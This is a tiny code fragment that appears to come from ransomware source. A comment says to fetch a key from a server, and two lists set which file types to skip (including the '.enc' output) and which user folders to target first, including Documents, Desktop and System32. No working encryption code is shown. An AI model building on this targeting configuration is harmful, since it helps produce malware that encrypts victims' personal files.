# get a KEY from the ecdec server
...
excluded_filetypes = ['.enc','.exe', '.bat', '.tar.gz', '.js', '.html', '.py','.dll']
priority_dirs = ['Documents', 'Downloads', 'Desktop','System32'] # would normally do all folders in users home dir
